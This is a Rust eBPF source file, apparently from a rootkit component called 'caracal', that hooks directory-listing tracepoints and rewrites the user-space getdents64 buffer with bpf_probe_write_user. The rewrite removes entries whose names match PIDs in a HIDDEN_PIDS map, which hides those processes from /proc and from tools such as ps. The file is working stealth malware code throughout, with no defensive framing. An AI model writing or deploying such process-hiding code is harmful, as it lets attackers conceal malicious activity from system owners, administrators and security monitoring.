use aya_ebpf::{
    cty::c_void,
    helpers::{
        bpf_get_current_pid_tgid, bpf_loop, bpf_probe_read_user, bpf_probe_read_user_str_bytes,
        bpf_probe_write_user,
    },
    macros::{map, tracepoint},
    maps::HashMap,
    programs::TracePointContext,
};
use aya_log_ebpf::{debug, error};
use caracal_common::{MAX_BPF_OBJ, MAX_DIRENTS, MAX_HIDDEN_PIDS};

#[map]
static PID_DIRENTS: HashMap<u32, u64> = HashMap::<u32, u64>::with_max_entries(MAX_BPF_OBJ, 0);
#[map]
static HIDDEN_PIDS: HashMap<u32, u8> = HashMap::<u32, u8>::with_max_entries(MAX_HIDDEN_PIDS, 0);

#[repr(C)]
#[derive(Debug)]
pub struct LinuxDirent64 {
    pub d_ino: ::aya_ebpf::cty::c_ulonglong,
    pub d_off: ::aya_ebpf::cty::c_longlong,
    pub d_reclen: ::aya_ebpf::cty::c_ushort,
    pub d_type: ::aya_ebpf::cty::c_uchar,
    pub d_name: [u8; 0],
}

#[repr(C)]
struct DirentIteratorData<'a> {
    ctx: &'a TracePointContext,
    bpos: u64,
    max_offset: u64,
    dirents_buf_addr: u64,
    d_reclen: u16,
    d_reclen_prev: u16,
}
#[tracepoint]
pub fn caracal_pid_enter(ctx: TracePointContext) -> Result<u32, u32> {
    let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;

    let dirents_buf_addr = unsafe { ctx.read_at::<u64>(24).map_err(|_| 1u32)? };
    PID_DIRENTS
        .insert(&caller_pid, &dirents_buf_addr, 0)
        .map_err(|_| 1u32)?;
    Ok(0)
}

#[tracepoint]
pub fn caracal_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
    let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;

    let max_offset = unsafe { ctx.read_at::<u64>(16).map_err(|_| 1u32)? };
    debug!(&ctx, "max offset is: {}", max_offset);
    let dirents_buf_addr = *unsafe { PID_DIRENTS.get(&caller_pid) }.ok_or(1u32)?;
    let mut dirent_data = DirentIteratorData {
        ctx: &ctx,
        bpos: 0,
        max_offset,
        dirents_buf_addr,
        d_reclen: 0,
        d_reclen_prev: 0,
    };

    unsafe {
        bpf_loop(
            MAX_DIRENTS,
            patch_dirent_if_found as *mut fn(u64, *mut c_void) -> i64 as *mut c_void,
            &mut dirent_data as *mut DirentIteratorData as *mut c_void,
            0,
        )
    };
    debug!(&ctx, "out of loop : {}/{} ", dirent_data.bpos, max_offset,);
    PID_DIRENTS.remove(&caller_pid).map_err(|_| 1u32)?;

    Ok(0)
}

#[inline]
fn remove_curr_dirent(ctx: &mut DirentIteratorData) -> Result<(), i64> {
    let d_reclen_new = ctx.d_reclen + ctx.d_reclen_prev;

    unsafe {
        bpf_probe_write_user(
            (ctx.dirents_buf_addr + ctx.bpos - ctx.d_reclen_prev as u64 + 16u64) as *mut u16,
            &d_reclen_new as *const u16,
        )?
    };

    Ok(())
}

#[inline]
fn parse_pid(buf: [u8; 10]) -> u32 {
    let mut pid: u32 = 0;
    let mut i = 0;

    while i < 10 {
        let b = buf[i];
        if b == 0 {
            break;
        }
        if !b.is_ascii_digit() {
            break;
        }
        pid = pid.wrapping_mul(10).wrapping_add((b - b'0') as u32);
        i += 1;
    }

    pid
}
#[inline]
fn patch_dirent_if_found(idx: u32, ctx: &mut DirentIteratorData) -> i64 {
    if idx >= MAX_DIRENTS {
        debug!(ctx.ctx, "{}>{}", idx, MAX_DIRENTS);
        return 1;
    }

    if ctx.bpos >= ctx.max_offset {
        debug!(ctx.ctx, "({}) maxoffset {} exceeded", idx, ctx.max_offset);
        return 1;
    }

    if let Ok(dirent) = unsafe {
        bpf_probe_read_user((ctx.dirents_buf_addr + ctx.bpos) as *const LinuxDirent64)
            .map_err(|_| 1u32)
    } {
        if [4u8, 8u8, 10u8].contains(&dirent.d_type) {
            ctx.d_reclen = dirent.d_reclen;

            let mut buf = [0u8; 10];
            let _ = unsafe {
                bpf_probe_read_user_str_bytes(
                    (ctx.dirents_buf_addr + ctx.bpos + 19) as *const u8,
                    &mut buf,
                )
                .unwrap()
            };

            let parsed_pid = parse_pid(buf);
            let found = unsafe { HIDDEN_PIDS.get(&parsed_pid).is_some() };
            if found {
                {
                    debug!(ctx.ctx, "FOUND IT!! @{} ", idx);
                    if remove_curr_dirent(ctx).is_err() {
                        error!(ctx.ctx, "Error in patching");
                        return 1;
                    }
                }
            }

            ctx.bpos += dirent.d_reclen as u64;
            if !found {
                ctx.d_reclen_prev = dirent.d_reclen;
            } else {
                // patch succeded: now we update in dirent iterator  d_reclen_prev
                ctx.d_reclen_prev += dirent.d_reclen;
            }
        }
        0
    } else {
        debug!(ctx.ctx, "dirent entry {} not found:(", idx);
        1
    }
}
